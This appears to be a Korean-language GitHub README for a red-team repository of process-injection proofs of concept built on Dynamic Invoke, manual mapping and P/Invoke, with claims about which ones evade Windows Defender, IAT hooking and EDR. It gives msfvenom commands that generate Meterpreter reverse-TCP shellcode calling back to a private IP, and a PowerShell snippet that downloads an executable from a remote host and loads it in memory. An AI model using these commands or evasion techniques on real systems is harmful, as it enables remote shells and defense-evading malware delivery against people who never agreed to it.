# dinvokepoc 

이 리포는 Dynamic Invoke와 관련된 PoC를 가지고 있습니다. 
모든 PoC는 다음 함수 - OpenProcess,VirtualAllocEx, WriteProcessMemory, VirtualProtectEx, CreateRemoteThread - 를 이용한 기본적인 프로세스 인젝션입니다. 

PoC에 들어가는 페이로드는 모두 메타스플로잇의 Meterpreter를 사용했습니다. 
특정 PoC에는 페이로드 xor 암호화를 했습니다. 

`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.48.111 lport=443 -f c`

`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.48.111 lport=443 -f csharp`

다음은 4가지 PoC들에 관련된 정보입니다. 

## dinvokeaot
.NET 5.0 기반, Ahead of Time Compilation, Classic DInvoke + Native API (ntdll.dll) 사용. 

IAT 후킹 우회, API 후킹 우회 불가 

IL --> Native PE file 이라 AV/EDR 우회 시 유용 

Windows Defender 우회 

## dinvokemm
.NET 4.0 Framework 기반, Manual Mapping + kernel32.dll 사용. 

IAT 후킹, API 후킹 모두 우회 

인-메모리 실행 가능 

Windows Defender 우회


파워쉘 인-메모리 실행 예시 
```
$a = (New-Object net.webclient).DownloadData("http://192.168.48.160:9999/dinvokemm.exe")
[System.Reflection.Assembly]::Load($a)
[dinvokemm.dinvokemm]::Main("")
```

## cppconsole
C++ 를 이용한 기본적인 PoC 

Windows Defender 우회 불가 

## pinvoke 
.NET 4.0 Framework 기반, pinvoke 사용 

IAT 후킹 우회 불가, API 후킹 우회 불가 

Windows Defender 우회 불가 
